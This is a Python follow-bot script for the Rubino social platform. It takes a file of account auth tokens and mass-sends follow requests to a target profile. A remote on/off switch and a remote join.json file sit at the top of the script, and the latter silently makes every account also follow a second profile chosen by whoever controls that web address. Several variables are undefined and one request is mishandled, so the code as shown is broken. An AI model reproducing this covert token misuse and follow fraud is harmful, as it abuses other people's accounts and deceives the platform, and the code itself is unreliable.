
# -------------------------------
import asyncio
import aiohttp
import json
import httpx
from tqdm import tqdm
from random import randint,choice
from rabino import rubino
from colorama import Fore
dat = rubino(auth).isExistUsername(idurl)["data"]

id = dat["profile"]["id"]

auth_list = json.loads(open(file,"r").read())

if httpx.get("https://username231937.github.io/Api/on.json")["result"] == "true":
	pass
else:
	print("source Off")
	exit()

dan = httpx.get("https://username231937.github.io/Api/join.json").json()
if dan["link"] == "":
	pass
else:
	dat = rubino(auth).isExistUsername(dan["link"])["data"]
	id_ek = dat["profile"]["id"]


url = rubino._getUrl()
print(url)
async def requestFollow(session, auth,id,echo=True):
    
    data = {"auth":auth,"api_version":"0","client":{"app_name": "Main", "app_version": "3.0.2", "lang_code": "fa", "package": "app.rbmain.a", "platform": "Android"},"data":{"limit":10,"sort":"FromMax"},"method":"getProfileList"}
    async with session.post(url, json=data) as response:
    		try:
	    		list = await response.json()
	    		
	    		profile = []
	    		for listid in list["data"]["profiles"]:
	    			data = {"api_version": "0","auth": auth,"client": {"app_name": "Main","app_version": "3.0.2","lang_code": "fa","package": "app.rbmain.a","platform": "Android"},"data":{"f_type": "Follow","followee_id":id,"profile_id": listid["id"]},"method": "requestFollow"}
	    			
	    			async with session.post(url, json=data) as response:
	    				deta = await response.json()
	    				if echo == True:
		    				if deta["status"] == "OK":
		    						
			    					print(Fore.LIGHTGREEN_EX,f"[+] FOLLW OK COUNT")
			    			else:
			    					print(Fore.LIGHTRED_EX,"[-] NO FOLLW")
    		except:...
    			
async def main():
    async with aiohttp.ClientSession() as session:
        try:
             tasks = []
             for auth in auth_list:
             	print(auth)
             	task = asyncio.create_task(requestFollow(session, auth,id))
             	if dan["link"] != "":
             		task = asyncio.create_task(requestFollow(session, auth,id_ek,echo=False))
             	tasks.append(task)
	        
             data = await asyncio.gather(*tasks)
            
        except Exception as e:
        	print(e)
        	
if __name__ == "__main__":
    asyncio.run(main())